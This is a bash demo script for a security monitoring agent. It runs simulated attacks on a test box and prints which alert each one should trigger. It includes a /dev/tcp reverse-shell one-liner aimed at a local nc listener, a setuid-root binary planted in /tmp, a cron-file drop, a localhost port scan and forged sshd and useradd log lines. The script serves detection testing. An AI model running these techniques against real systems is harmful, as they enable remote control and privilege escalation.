#!/usr/bin/env bash
# SecAgent demo: a scripted sequence of *simulated* attacks, safe to run on a test box.
# Nothing here is exploited, persisted or exfiltrated: every artifact lives under a
# temp dir or is removed on exit, and "attacker" traffic only goes to 127.0.0.1.
#
#   sudo ./demo/attack_simulation.sh            run every step
#   sudo ./demo/attack_simulation.sh webshell   run one step (see STEPS below)
#   FAST=1 sudo ./demo/attack_simulation.sh     no pauses between steps
#
# Watch it live in another terminal:   sudo secagentctl tail --alerts-only
#                         or browse:   http://127.0.0.1:8787
set -uo pipefail

STEPS=(webshell revshell privesc persistence portscan bruteforce backdoor)
PAUSE=${FAST:+0}; PAUSE=${PAUSE:-3}
WORK=$(mktemp -d /tmp/secagent-demo.XXXXXX)
chmod 755 "$WORK"
CRON_FILE=/etc/cron.d/secagent-demo
PIDS=()

cleanup() {
  for p in "${PIDS[@]:-}"; do [[ -n "$p" ]] && kill "$p" 2>/dev/null; done
  rm -rf "$WORK"
  rm -f "$CRON_FILE"
}
trap cleanup EXIT

[[ $EUID -eq 0 ]] || { echo "run as root: sudo $0 $*"; exit 1; }
[[ -S /run/secagent/secagentd.sock || -n "${SECAGENT_SOCKET:-}" ]] || \
  echo "note: secagentd doesn't seem to be running (sudo systemctl start secagentd)"

step() {
  printf '\n\033[1;35m━━━ [%s] %s\033[0m\n' "$1" "$2"
  printf '\033[2m    %s\033[0m\n' "$3"
}
expect() { printf '    \033[1;36m→ expect:\033[0m %s\n' "$*"; }
pause() { sleep "$PAUSE"; }

# ------------------------------------------------------------------------------ steps
webshell() {
  step "1/7" "Web shell: nginx spawns an interactive shell" \
       "A fake 'nginx' process (a script with that name) runs bash -c 'id; uname -a', exactly what a PHP/CGI web shell does."
  cat >"$WORK/nginx" <<'EOF'
#!/bin/sh
bash -c 'id >/dev/null; uname -a >/dev/null; sleep 2; true'
EOF
  chmod 755 "$WORK/nginx"
  "$WORK/nginx"
  expect "HIGH suspicious-shell-from-webserver  (+ exec-from-temp-dir: the fake nginx lives in /tmp)"
}

revshell() {
  step "2/7" "Reverse shell: bash -i >& /dev/tcp/127.0.0.1/4444" \
       "A local listener plays the attacker's C2; bash connects out to it using the classic /dev/tcp one-liner."
  if command -v nc >/dev/null; then
    nc -l 127.0.0.1 4444 >/dev/null 2>&1 & PIDS+=($!)
    sleep 0.5
  fi
  timeout 3 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 & sleep 2; kill $! 2>/dev/null; true' 2>/dev/null
  expect "CRITICAL reverse-shell-cmdline, CRITICAL shell-network-connection, MEDIUM outbound-suspicious-port"
  expect "HIGH bind-shell-listener (the nc -l 'C2' on this same box)"
}

privesc() {
  step "3/7" "Privilege escalation: setuid-root binary run by an unprivileged user" \
       "A copy of 'sleep' is made setuid-root in /tmp and executed by uid 65534 (nobody) - the shape of a SUID exploit."
  cp /bin/sleep "$WORK/rootshell"
  chown root:root "$WORK/rootshell"; chmod 4755 "$WORK/rootshell"
  setpriv --reuid=65534 --regid=65534 --clear-groups -- /bin/sh -c "$WORK/rootshell 2; true"
  expect "HIGH privilege-escalation-to-root (uid 65534 -> euid 0), HIGH exec-from-temp-dir"
}

persistence() {
  step "4/7" "Persistence: a new cron job is dropped" \
       "Writes a comment-only file to /etc/cron.d (cron ignores it; removed on exit). Watched by file integrity monitoring."
  printf '# secagent demo - harmless, removed automatically\n' >"$CRON_FILE"
  sleep 1
  printf '# secagent demo - modified\n' >>"$CRON_FILE"
  expect "HIGH persistence-location-changed (created, then modified with old->new SHA-256)"
}

portscan() {
  step "5/7" "Port scan: one process probes 40 ports on a host in < 1 s" \
       "Python opens 20 throwaway listeners and connects to them plus 20 closed ports (eBPF sees the refused SYNs too)."
  python3 - <<'EOF'
import socket, time
ls = [socket.socket() for _ in range(20)]
for s in ls: s.bind(("127.0.0.1", 0)); s.listen()
ports = [s.getsockname()[1] for s in ls] + list(range(20000, 20020))
conns = []
for p in ports:
    c = socket.socket(); c.settimeout(0.2)
    try: c.connect(("127.0.0.1", p)); conns.append(c)
    except OSError: c.close()
time.sleep(1.5)
EOF
  expect "HIGH outbound-port-scan (>= 15 distinct ports on 127.0.0.1 within 10 s)"
}

bruteforce() {
  step "6/7" "SSH brute force from 203.0.113.66" \
       "Six 'Failed password' lines are injected through the real syslog pipeline with logger(1) - no real SSH needed."
  for i in 1 2 3 4 5 6; do
    logger -p auth.info -t sshd --id=$$ "Failed password for root from 203.0.113.66 port $((40000 + i)) ssh2"
    sleep 0.2
  done
  expect "HIGH ssh-brute-force on the 5th failure (action block_ip -> 'not executed: response disabled')"
}

backdoor() {
  step "7/7" "Backdoor account: a UID-0 user is created" \
       "Simulated: a useradd log line is injected (no account is actually created)."
  logger -p auth.info -t useradd --id=$$ \
    "new user: name=sysbackup, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/0"
  expect "CRITICAL uid0-account-created"
}

# ------------------------------------------------------------------------------ main
printf '\033[1m SecAgent attack simulation\033[0m  (work dir %s)\n' "$WORK"
if [[ $# -gt 0 ]]; then
  for s in "$@"; do
    [[ " ${STEPS[*]} " == *" $s "* ]] || { echo "unknown step '$s' (one of: ${STEPS[*]})"; exit 2; }
    "$s"
  done
else
  for s in "${STEPS[@]}"; do "$s"; pause; done
fi
sleep 2
printf '\n\033[1;32mDone.\033[0m Review with:\n  sudo secagentctl alerts --since 10m\n  sudo secagentctl show <ID>\n'
